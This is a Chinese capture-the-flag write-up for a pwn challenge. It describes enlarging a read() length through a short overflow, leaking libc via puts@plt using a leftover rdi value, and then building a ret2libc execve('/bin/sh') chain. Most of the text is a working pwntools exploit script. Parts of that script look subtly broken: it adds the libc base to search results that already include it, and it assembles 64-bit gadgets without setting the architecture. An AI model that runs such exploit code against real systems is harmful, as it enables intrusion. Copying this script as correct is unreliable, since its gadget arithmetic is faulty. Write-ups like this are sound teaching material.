# System_not_found!

## 题目简述

程序没有现成 `system`，主程序里也找不到常用的 `pop rdi; ret`。第一次短溢出可以改写后续 `read` 使用的长度变量，从而得到一次足够长的栈溢出；随后要利用函数返回前遗留的寄存器状态泄漏 libc，再从 libc 中取 gadget 调用 `execve`。

## 解题过程

第一次输入覆盖栈上的 `nbytes`，将下一次 `read` 长度改为 1000。第二次输入覆盖返回地址时，观察到 `rdi` 恰好指向一个保存 libc 指针的槽，该指针可按 `funlockfile` 的地址校准。即使主程序没有 `pop rdi`，也能先直接返回 `puts@plt`，让它输出该槽中的字节，再返回 `main` 进行第二轮。

```python
from pwn import ELF, asm, cyclic, flat, p64, remote, u64

io = remote("host", 10000)
elf = ELF("./dialogue")
libc = ELF("./libc.so.6")

def enlarge_read():
    # 只发送 p64(1000) 的低 6 字节，避免额外的字符串终止影响相邻数据。
    io.sendafter(b"> ", cyclic(0x10) + p64(1000)[:6])

enlarge_read()
leak_chain = cyclic(48) + p64(elf.plt["puts"]) + p64(elf.sym["main"])
io.sendafter(b"> ", leak_chain)

io.recvuntil(b".\n")
funlockfile = u64(io.recvn(6).ljust(8, b"\x00"))
libc.address = funlockfile - libc.sym["funlockfile"]

bin_sh = next(libc.search(b"/bin/sh\x00"))
pop_rdi = libc.address + next(libc.search(asm("pop rdi; ret")))
pop_rsi = libc.address + next(libc.search(asm("pop rsi; ret")))

enlarge_read()
shell_chain = flat(
    cyclic(48),
    pop_rdi, bin_sh,
    pop_rsi, 0,
    libc.sym["execve"],  # 此处依赖程序现场的 rdx 已为 0
)
io.sendafter(b"> ", shell_chain)
io.interactive()
```

若实际运行时 `rdx` 不为零，应再从 libc 中寻找可控 `rdx` 的 gadget，把 `envp` 明确设为 0。

## 方法总结

缺少 `pop rdi` 时，不应立即认定无法 ROP。函数调用后的寄存器残值本身就是资源：先在调试器里确认返回点的寄存器，再寻找能消费该寄存器的 PLT 函数。泄漏 libc 后，gadget 搜索范围扩展到整份 libc，第二阶段就容易得多。
